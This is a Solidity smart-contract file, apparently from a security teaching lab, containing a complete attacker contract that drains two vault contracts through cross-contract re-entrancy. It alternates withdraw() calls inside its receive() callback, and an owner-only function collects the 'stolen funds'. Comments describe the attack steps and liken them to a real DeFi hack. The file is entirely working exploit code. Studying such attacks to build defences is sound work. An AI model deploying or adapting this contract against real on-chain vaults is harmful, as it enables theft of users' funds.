// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VaultA.sol";
import "./VaultB.sol";

/**
 * @title CrossContractAttacker
 * @dev Exploits cross-contract re-entrancy across VaultA and VaultB
 * 
 * ATTACK STRATEGY:
 * This attacker demonstrates a sophisticated multi-contract exploit:
 * 1. Deposit funds in both VaultA and VaultB
 * 2. Start by withdrawing from VaultA
 * 3. When VaultA sends ETH (callback), withdraw from VaultB
 * 4. When VaultB sends ETH (nested callback), withdraw from VaultA again
 * 5. Continue alternating between vaults until both are drained
 * 
 * This creates a complex call stack:
 * VaultA.withdraw() → receive() → VaultB.withdraw() → receive() → VaultA.withdraw() → ...
 * 
 * Real-world example: Cream Finance hack (2021) used similar cross-contract techniques
 */
contract CrossContractAttacker {
    VaultA public vaultA;
    VaultB public vaultB;
    address public owner;
    
    uint256 public attackStep;
    bool public attackInProgress;
    
    // Track which vault to attack next
    enum NextTarget { VAULT_A, VAULT_B, DONE }
    NextTarget public nextTarget;
    
    event AttackStep(uint256 step, string vault, string action, uint256 vaultABalance, uint256 vaultBBalance);
    
    constructor(address _vaultAAddress, address _vaultBAddress) {
        vaultA = VaultA(_vaultAAddress);
        vaultB = VaultB(_vaultBAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev Initiate cross-contract attack
     * Deposits in both vaults, then starts the attack chain
     */
    function attack() external payable {
        require(msg.value >= 2 ether, "Need at least 2 ETH (1 per vault)");
        require(!attackInProgress, "Attack already in progress");
        
        attackInProgress = true;
        attackStep = 0;
        nextTarget = NextTarget.VAULT_A;
        
        uint256 amountPerVault = msg.value / 2;
        
        // Deposit in both vaults
        vaultA.deposit{value: amountPerVault}();
        vaultB.deposit{value: amountPerVault}();
        
        emit AttackStep(0, "Setup", "Deposited in both vaults", 
                       address(vaultA).balance, address(vaultB).balance);
        
        // Start the attack by withdrawing from VaultA
        vaultA.withdraw();
    }
    
    /**
     * @dev Fallback function - orchestrates the cross-contract attack
     * 
     * ATTACK LOGIC:
     * Each time we receive ETH, we alternate between attacking VaultA and VaultB
     * This creates a ping-pong effect that drains both contracts
     */
    receive() external payable {
        attackStep++;
        
        uint256 vaultABalance = address(vaultA).balance;
        uint256 vaultBBalance = address(vaultB).balance;
        
        // Check if both vaults still have funds
        bool vaultAHasFunds = vaultABalance >= 1 ether;
        bool vaultBHasFunds = vaultBBalance >= 1 ether;
        
        if (!vaultAHasFunds && !vaultBHasFunds) {
            // Both vaults drained, attack complete
            nextTarget = NextTarget.DONE;
            attackInProgress = false;
            emit AttackStep(attackStep, "Complete", "Both vaults drained", 
                           vaultABalance, vaultBBalance);
            return;
        }
        
        // Alternate between vaults
        if (nextTarget == NextTarget.VAULT_A && vaultAHasFunds) {
            // Attack VaultA
            uint256 myBalanceA = vaultA.getUserBalance(address(this));
            if (myBalanceA > 0) {
                emit AttackStep(attackStep, "VaultA", "Re-entering withdraw()", 
                               vaultABalance, vaultBBalance);
                nextTarget = NextTarget.VAULT_B;
                try vaultA.withdraw() {
                    // Success
                } catch {
                    // Attack prevented
                    attackInProgress = false;
                }
            } else {
                // No balance in VaultA, switch to VaultB
                nextTarget = NextTarget.VAULT_B;
            }
        } else if (nextTarget == NextTarget.VAULT_B && vaultBHasFunds) {
            // Attack VaultB
            uint256 myBalanceB = vaultB.getUserBalance(address(this));
            if (myBalanceB > 0) {
                emit AttackStep(attackStep, "VaultB", "Re-entering withdraw()", 
                               vaultABalance, vaultBBalance);
                nextTarget = NextTarget.VAULT_A;
                try vaultB.withdraw() {
                    // Success
                } catch {
                    // Attack prevented
                    attackInProgress = false;
                }
            } else {
                // No balance in VaultB, switch to VaultA
                nextTarget = NextTarget.VAULT_A;
            }
        } else {
            // One vault is drained, continue with the other
            if (vaultAHasFunds) {
                nextTarget = NextTarget.VAULT_A;
                uint256 myBalanceA = vaultA.getUserBalance(address(this));
                if (myBalanceA > 0) {
                    try vaultA.withdraw() {} catch {}
                }
            } else if (vaultBHasFunds) {
                nextTarget = NextTarget.VAULT_B;
                uint256 myBalanceB = vaultB.getUserBalance(address(this));
                if (myBalanceB > 0) {
                    try vaultB.withdraw() {} catch {}
                }
            }
        }
    }
    
    /**
     * @dev Collect stolen funds
     */
    function collectStolenFunds() external {
        require(msg.sender == owner, "Only owner can collect");
        require(!attackInProgress, "Attack still in progress");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Get attacker contract's balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Get number of attack steps executed
     */
    function getAttackSteps() public view returns (uint256) {
        return attackStep;
    }
    
    /**
     * @dev Get attack status
     */
    function getAttackStatus() public view returns (
        bool inProgress,
        uint256 steps,
        string memory nextTargetName,
        uint256 vaultABalance,
        uint256 vaultBBalance
    ) {
        string memory target;
        if (nextTarget == NextTarget.VAULT_A) {
            target = "Vault A";
        } else if (nextTarget == NextTarget.VAULT_B) {
            target = "Vault B";
        } else {
            target = "Done";
        }
        
        return (
            attackInProgress,
            attackStep,
            target,
            address(vaultA).balance,
            address(vaultB).balance
        );
    }
}
